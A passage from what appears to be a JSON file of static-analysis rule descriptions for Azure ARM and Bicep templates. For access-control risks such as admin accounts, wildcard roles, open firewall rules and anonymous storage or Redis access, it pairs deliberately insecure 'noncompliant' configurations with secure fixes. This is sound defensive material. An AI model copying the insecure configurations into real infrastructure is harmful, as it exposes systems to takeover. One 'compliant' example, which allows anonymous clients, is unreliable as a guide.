<a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "azureresourcemanager:S6379": {
        "name": "Enabling Azure resource-specific admin accounts is security-sensitive",
        "htmlDesc": "<p>Enabling Azure resource-specific admin accounts can reduce an organization’s ability to protect itself against account or service account\nthefts.</p>\n<p>Full Administrator permissions fail to correctly separate duties and create potentially critical attack vectors on the impacted resources.</p>\n<p>In case of abuse of elevated permissions, both the data on which impacted resources operate and their access traceability are at risk.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Azure resource is essential for the information system infrastructure. </li>\n  <li> This Azure resource is essential for mission-critical functions. </li>\n  <li> Compliance policies require this resource to disable its administrative accounts or permissions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Disable the administrative accounts or permissions in this Azure resource.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools\">Azure Batch Pools</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Batch/batchAccounts/pools\",\n      \"apiVersion\": \"2022-10-01\",\n      \"properties\": {\n        \"startTask\": {\n          \"userIdentity\": {\n            \"autoUser\": {\n              \"elevationLevel\": \"Admin\"\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nresource AdminBatchPool 'Microsoft.Batch/batchAccounts/pools@2022-10-01' = {\n  properties: {\n    startTask: {\n      userIdentity: {\n        autoUser: {\n          elevationLevel: 'Admin' // Sensitive\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/container-registry/\">Azure Container Registries</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.ContainerRegistry/registries\",\n      \"apiVersion\": \"2023-01-01-preview\",\n      \"properties\": {\n        \"adminUserEnabled\": true\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nresource acrAdminUserDisabled 'Microsoft.ContainerRegistry/registries@2021-09-01' = {\n  properties: {\n    adminUserEnabled: true // Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools\">Azure Batch Pools</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Batch/batchAccounts/pools\",\n      \"apiVersion\": \"2022-10-01\",\n      \"properties\": {\n        \"startTask\": {\n          \"userIdentity\": {\n            \"autoUser\": {\n              \"elevationLevel\": \"NonAdmin\"\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nresource AdminBatchPool 'Microsoft.Batch/batchAccounts/pools@2022-10-01' = {\n  properties: {\n    startTask: {\n      userIdentity: {\n        autoUser: {\n          elevationLevel: 'NonAdmin'\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/container-registry/\">Azure Container Registries</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.ContainerRegistry/registries\",\n      \"apiVersion\": \"2023-01-01-preview\",\n      \"properties\": {\n        \"adminUserEnabled\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nresource acrAdminUserDisabled 'Microsoft.ContainerRegistry/registries@2021-09-01' = {\n  properties: {\n    adminUserEnabled: false\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "azureresourcemanager:S6385": {
        "name": "Azure custom roles should not grant subscription Owner capabilities",
        "htmlDesc": "<p>Defining a custom role at the <code>Subscription</code> or <code>Management group</code> scope that allows all actions will give it the same\ncapabilities as the built-in <code>Owner</code> role.</p>\n<h2>Why is this an issue?</h2>\n<p>In Azure, the <code>Owner</code> role of a <code>Subscription</code> or a <code>Management group</code> provides entities it is assigned to with\nthe maximum level of privileges. The <code>Owner</code> role allows managing all resources and assigning any role to other entities.</p>\n<p>Because it is a powerful entitlement, it should be granted to as few users as possible.</p>\n<p>When a custom role has the same level of permissions as the <code>Owner</code> one, there are greater chances that high privileges are granted to\ntoo many users.</p>\n<h3>What is the potential impact?</h3>\n<p>Custom roles that provide the same level of permissions as <code>Owner</code> might indicate a configuration issue. Any entity assigned with it can\nperform any action on the <code>Subscription</code> or <code>Management group</code>, including changing roles and permissions.</p>\n<p>If the affected role is unexpectedly assigned to users, they can compromise the affected scope. They can do so in the long term by assigning\ndangerous roles to other users or entities.</p>\n<p>Depending on the scope to which the role is assignable, the exact impact of a successful exploitation may vary. It generally ranges from data\ncompromise to the takeover of the cloud infrastructure.</p>\n<h4>Infrastructure takeover</h4>\n<p>By obtaining the right role, an attacker can gain control over part or all of the Azure infrastructure. They can modify DNS settings, redirect\ntraffic, or launch malicious instances that can be used for various nefarious activities, including launching DDoS attacks, hosting phishing websites,\nor distributing malware. Malicious instances may also be used for resource-intensive tasks such as cryptocurrency mining.</p>\n<p>This can result in legal liability, but also increased costs, degraded performance, and potential service disruptions.</p>\n<p>Furthermore, corporate Azure infrastructures are often connected to other services and to the internal networks of the organization. Because of\nthis, cloud infrastructure is often used by attackers as a gateway to other assets. Attackers can leverage this gateway to gain access to more\nservices, to compromise more business-critical data, and to cause more damage to the overall infrastructure.</p>\n<h4>Compromise of sensitive data</h4>\n<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers with the correct role\ncould be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity theft, financial loss, or\nother negative outcomes.</p>\n<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>\n<h4>Financial loss</h4>\n<p>Financial losses can occur when a malicious user is able to use a paid third-party-provided service. Each users assigned with a bad role will be\nable to use it without limit to use the third party service to their own need, including in a way that was not expected.</p>\n<p>This additional use will lead to added costs with the Azure service provider.</p>\n<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected\nenvironment. This might result in a partial denial of service for all legitimate users.</p>\n<h2>How to fix it</h2>\n<p>To reduce the risk of intrusion of a compromised owner, it is recommended to limit the number of subscription owners.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Authorization/roleDefinitions\",\n      \"apiVersion\": \"2022-04-01\",\n      \"properties\": {\n        \"permissions\": [\n          {\n            \"actions\": [\"*\"],\n            \"notActions\": []\n          }\n        ],\n        \"assignableScopes\": [\n          \"[subscription().id]\"\n        ]\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\ntargetScope = 'managementGroup'\n\nresource roleDef 'Microsoft.Authorization/roleDefinitions@2022-04-01' = { // Sensitive\n  properties: {\n    permissions: [\n      {\n        actions: ['*']\n        notActions: []\n      }\n    ]\n\n    assignableScopes: [\n      managementGroup().id\n    ]\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Authorization/roleDefinitions\",\n      \"apiVersion\": \"2022-04-01\",\n      \"properties\": {\n        \"permissions\": [\n          {\n            \"actions\": [\"Microsoft.Compute/*\"],\n            \"notActions\": []\n          }\n        ],\n        \"assignableScopes\": [\n          \"[subscription().id]\"\n        ]\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\ntargetScope = 'managementGroup'\n\nresource roleDef 'Microsoft.Authorization/roleDefinitions@2022-04-01' = {\n  properties: {\n    permissions: [\n      {\n        actions: ['Microsoft.Compute/*']\n        notActions: []\n      }\n    ]\n\n    assignableScopes: [\n      managementGroup().id\n    ]\n  }\n}\n</pre>\n<h3>Going the extra mile</h3>\n<p>Here is a list of recommendations that can be followed regarding good usage of roles:</p>\n<ul>\n  <li> Apply the least privilege principle by creating a custom role with as few permissions as possible. </li>\n  <li> As custom roles can be updated, gradually add atomic permissions when required. </li>\n  <li> Limit the assignable scopes of the custom role to a set of Resources or Resource Groups. </li>\n  <li> When necessary, use the built-in Owner role instead of a custom role granting subscription owner capabilities. </li>\n  <li> Limit the assignments of Owner roles to less than three people or service principals. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Azure Documentation - <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/custom-roles\">Azure custom roles</a> </li>\n  <li> Azure Documentation - <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices\">Best practices for Azure\n  RBAC</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "azureresourcemanager:S6321": {
        "name": "Administration services access should be restricted to specific IP addresses",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Cloud platforms such as Azure support virtual firewalls that can be used to restrict access to services by controlling inbound and outbound\ntraffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services traditionally listen,\nsuch as 22 for SSH, can expose these services to exploits and unauthorized access.</p>\n<h3>What is the potential impact?</h3>\n<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a\nvulnerability could have a high impact on the system.</p>\n<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the\ncredentials to log in to the system.</p>\n<h2>How to fix it</h2>\n<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those\nheld by system administrators or those of <a href=\"https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls\">bastion-like</a>\nservers.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"networkSecurityGroups/example\",\n      \"type\": \"Microsoft.Network/networkSecurityGroups/securityRules\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"protocol\": \"*\",\n        \"destinationPortRange\": \"*\",\n        \"sourceAddressPrefix\": \"*\",\n        \"access\": \"Allow\",\n        \"direction\": \"Inbound\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource securityRules 'Microsoft.Network/networkSecurityGroups/securityRules@2022-11-01' = {\n  name: 'securityRules'\n  properties: {\n    direction: 'Inbound'\n    access: 'Allow'\n    protocol: '*'\n    destinationPortRange: '*'\n    sourceAddressPrefix: '*'\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"networkSecurityGroups/example\",\n      \"type\": \"Microsoft.Network/networkSecurityGroups/securityRules\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n          \"protocol\": \"*\",\n          \"destinationPortRange\": \"22\",\n          \"sourceAddressPrefix\": \"10.0.0.0/24\",\n          \"access\": \"Allow\",\n          \"direction\": \"Inbound\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource securityRules 'Microsoft.Network/networkSecurityGroups/securityRules@2022-11-01' = {\n  name: 'securityRules'\n  properties: {\n    direction: 'Inbound'\n    access: 'Allow'\n    protocol: '*'\n    destinationPortRange: '22'\n    sourceAddressPrefix: '10.0.0.0/24'\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html\">AWS Documentation</a> - Security groups for your VPC </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview\">Azure Documentation</a> - Network security\n  groups </li>\n  <li> <a href=\"https://cloud.google.com/vpc/docs/using-firewalls\">GCP Documentation</a> - Firewalls </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "azureresourcemanager:S6381": {
        "name": "Assigning high privileges Azure Resource Manager built-in roles is security-sensitive",
        "htmlDesc": "<p>Azure Resource Manager offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully\nassigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>\n<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>\n<p>This rule raises an issue when one of the following roles is assigned:</p>\n<ul>\n  <li> Contributor (b24988ac-6180-42a0-ab88-20f7382dd24c) </li>\n  <li> Owner (8e3af657-a8ff-443c-a75c-2fe8c4bcb635) </li>\n  <li> User Access Administrator (18d7d88d-d35e-4fb5-a5c3-7773c20a72d9) </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li>\n  <li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Limit the assignment of Owner roles to less than 3 people or service principals. </li>\n  <li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li>\n  <li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Authorization/roleAssignments\",\n      \"apiVersion\": \"2022-04-01\",\n      \"properties\": {\n        \"description\": \"Assign the contributor role\",\n        \"principalId\": \"string\",\n        \"principalType\": \"ServicePrincipal\",\n        \"roleDefinitionId\": \"[resourceId('Microsoft.Authorization/roleDefinitions', 'b24988ac-6180-42a0-ab88-20f7382dd24c')]\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Authorization/roleAssignments@2022-04-01' = {\n  scope: tenant()\n  properties: {\n    description: 'Assign the contributor role'\n    principalId: 'string'\n    principalType: 'ServicePrincipal'\n    roleDefinitionId: resourceId('Microsoft.Authorization/roleAssignments', 'b24988ac-6180-42a0-ab88-20f7382dd24c') // Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Authorization/roleAssignments\",\n      \"apiVersion\": \"2022-04-01\",\n      \"properties\": {\n        \"description\": \"Assign the reader role\",\n        \"principalId\": \"string\",\n        \"principalType\": \"ServicePrincipal\",\n        \"roleDefinitionId\": \"[resourceId('Microsoft.Authorization/roleDefinitions', 'acdd72a7-3385-48ef-bd42-f606fba81ae7')]\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Authorization/roleAssignments@2022-04-01' = {\n  scope: tenant()\n  properties: {\n    description: 'Assign the reader role'\n    principalId: 'string'\n    principalType: 'ServicePrincipal'\n    roleDefinitionId: resourceId('Microsoft.Authorization/roleAssignments', 'acdd72a7-3385-48ef-bd42-f606fba81ae7')\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles\">Azure Documentation</a> - Azure built-in roles </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices\">Azure Documentation</a> - Best practices for Azure\n  RBAC </li>\n</ul>",
        "severity": "MAJOR"
      },
      "azureresourcemanager:S6387": {
        "name": "Azure role assignments that grant access to all resources of a subscription are security-sensitive",
        "htmlDesc": "<p>Azure RBAC roles can be assigned to users, groups, or service principals. A role assignment grants permissions on a predefined set of resources\ncalled \"scope\".</p>\n<p>The widest scopes a role can be assigned to are:</p>\n<ul>\n  <li> Subscription: a role assigned with this scope grants access to all resources of this Subscription. </li>\n  <li> Management Group: a scope assigned with this scope grants access to all resources of all the Subscriptions in this Management Group. </li>\n</ul>\n<p>In case of security incidents involving a compromised identity (user, group, or service principal), limiting its role assignment to the narrowest\nscope possible helps separate duties and limits what resources are at risk.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The user, group, or service principal doesn’t use the entirety of the resources in the scope to operate on a day-to-day basis. </li>\n  <li> It is possible to follow the Separation of Duties principle and split the scope into multiple role assignments with a narrower scope. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Limit the scope of the role assignment to a Resource or Resource Group. </li>\n  <li> Apply the least privilege principle by assigning roles granting as few permissions as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\ntargetScope = 'subscription' // Sensitive\n\nresource roleAssignment 'Microsoft.Authorization/roleAssignments@2022-04-01' = {\n  name: guid(subscription().id, 'exampleRoleAssignment')\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2018-05-01/subscriptionDeploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Authorization/roleAssignments\",\n      \"apiVersion\": \"2022-04-01\",\n      \"name\": \"[guid(subscription().id, 'exampleRoleAssignment')]\"\n    }\n  ]\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ntargetScope = 'resourceGroup'\n\nresource roleAssignment 'Microsoft.Authorization/roleAssignments@2022-04-01' = {\n  name: guid(resourceGroup().id, 'exampleRoleAssignment')\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Authorization/roleAssignments\",\n      \"apiVersion\": \"2022-04-01\",\n      \"name\": \"[guid(resourceGroup().id, 'exampleRoleAssignment')]\"\n    }\n  ]\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/scope-overview\">Azure Documentation</a> - Understand scope for Azure\n  RBAC </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices\">Azure Documentation</a> - Best practices for Azure\n  RBAC </li>\n</ul>",
        "severity": "MAJOR"
      },
      "azureresourcemanager:S6380": {
        "name": "Authorizing anonymous access to Azure resources is security-sensitive",
        "htmlDesc": "<p>Allowing anonymous access can reduce an organization’s ability to protect itself against attacks on its Azure resources.</p>\n<p>Security incidents may include disrupting critical functions, data theft, and additional Azure subscription costs due to resource overload.</p>\n<p>Using authentication coupled with fine-grained authorizations helps bring defense-in-depth and bring traceability to investigators of security\nincidents.</p>\n<p>Depending on the affected Azure resource, multiple authentication choices are possible: Active Directory Authentication, OpenID implementations\n(Google, Microsoft, etc.) or native Azure mechanisms.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Azure resource is essential for the information system infrastructure. </li>\n  <li> This Azure resource is essential for mission-critical functions. </li>\n  <li> This Azure resource stores or processes sensitive data. </li>\n  <li> Compliance policies require access to this resource to be authenticated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable authentication in this Azure resource, and disable anonymous access.</p>\n<p>If only Basic Authentication is available, enable it.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/app-service/\">App Service</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Web/sites\",\n            \"apiVersion\": \"2022-03-01\",\n            \"name\": \"example\"\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nresource appService 'Microsoft.Web/sites@2022-09-01' = {\n    name: 'example'\n    // Sensitive: no authentication defined\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/api-management/\">API Management</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.ApiManagement/service\",\n            \"apiVersion\": \"2022-09-01-preview\",\n            \"name\": \"example\"\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"102\" data-diff-type=\"noncompliant\">\nresource apiManagementService 'Microsoft.ApiManagement/service@2022-09-01-preview' = {\n    name: 'example'\n    // Sensitive: no portal authentication defined\n\n    resource apis 'apis@2022-09-01-preview' = {\n        name: 'exampleApi'\n        properties: {\n            path: '/test'\n            // Sensitive: no API authentication defined\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/data-factory/\">Data Factory</a> Linked Services:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.DataFactory/factories/linkedservices\",\n            \"apiVersion\": \"2018-06-01\",\n            \"name\": \"example\",\n            \"properties\": {\n                \"type\": \"Web\",\n                \"typeProperties\": {\n                    \"authenticationType\": \"Anonymous\"\n                }\n            }\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"103\" data-diff-type=\"noncompliant\">\nresource linkedService 'Microsoft.DataFactory/factories/linkedservices@2018-06-01' = {\n    name: 'example'\n    properties: {\n        type: 'Web'\n        typeProperties: {\n            authenticationType: 'Anonymous' // Sensitive\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/product-categories/storage/\">Storage Accounts and Storage Containers</a>:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Storage/storageAccounts\",\n            \"apiVersion\": \"2022-09-01\",\n            \"name\": \"example\",\n            \"properties\": {\n                \"allowBlobPublicAccess\": true\n            }\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"104\" data-diff-type=\"noncompliant\">\nresource storageAccount 'Microsoft.Storage/storageAccounts@2022-09-01' = {\n    name: 'example'\n    properties: {\n        allowBlobPublicAccess: true // Sensitive\n    }\n}\n</pre>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Storage/storageAccounts\",\n            \"apiVersion\": \"2022-09-01\",\n            \"name\": \"example\",\n            \"resources\": [\n                {\n                    \"type\": \"blobServices/containers\",\n                    \"apiVersion\": \"2022-09-01\",\n                    \"name\": \"blobContainerExample\",\n                    \"properties\": {\n                        \"publicAccess\": \"Blob\"\n                    }\n                }\n            ]\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"105\" data-diff-type=\"noncompliant\">\nresource storageAccount 'Microsoft.Storage/storageAccounts@2022-09-01' = {\n    name: 'example'\n\n    resource blobService 'blobServices@2022-09-01' = {\n        name: 'default'\n\n        resource containers 'containers@2022-09-01' = {\n            name: 'exampleContainer'\n            properties: {\n                publicAccess: 'Blob' // Sensitive\n            }\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/cache/\">Redis Caches</a>:</p>\n<pre data-diff-id=\"6\" data-diff-type=\"noncompliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Cache/redis\",\n            \"apiVersion\": \"2022-06-01\",\n            \"name\": \"example\",\n            \"properties\": {\n                \"redisConfiguration\": {\n                    \"authnotrequired\": \"true\"\n                }\n            }\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"106\" data-diff-type=\"noncompliant\">\nresource redisCache 'Microsoft.Cache/redis@2023-04-01' = {\n    name: 'example'\n    location: location\n    properties: {\n        redisConfiguration: {\n            authnotrequired: 'true' // Sensitive\n        }\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/app-service/\">App Services and equivalent</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Web/sites\",\n            \"apiVersion\": \"2022-03-01\",\n            \"name\": \"example\",\n            \"resources\": [\n                {\n                    \"type\": \"config\",\n                    \"apiVersion\": \"2022-03-01\",\n                    \"name\": \"authsettingsV2\",\n                    \"properties\": {\n                        \"globalValidation\": {\n                            \"requireAuthentication\": true,\n                            \"unauthenticatedClientAction\": \"RedirectToLoginPage\"\n                        }\n                    }\n                }\n            ]\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\nresource appService 'Microsoft.Web/sites@2022-09-01' = {\n    name: 'example'\n\n    resource authSettings 'config@2022-09-01' = { // Compliant\n        name: 'authsettingsV2'\n        properties: {\n            globalValidation: {\n                requireAuthentication: true\n                unauthenticatedClientAction: 'AllowAnonymous'\n            }\n            platform: {\n                enabled: true\n            }\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/api-management/\">API Management</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.ApiManagement/service\",\n            \"apiVersion\": \"2022-09-01-preview\",\n            \"name\": \"example\",\n            \"resources\": [\n                {\n                    \"type\": \"portalsettings\",\n                    \"apiVersion\": \"2022-09-01-preview\",\n                    \"name\": \"signin\",\n                    \"properties\": {\n                        \"enabled\": true\n                    }\n                },\n                {\n                    \"type\": \"apis\",\n                    \"apiVersion\": 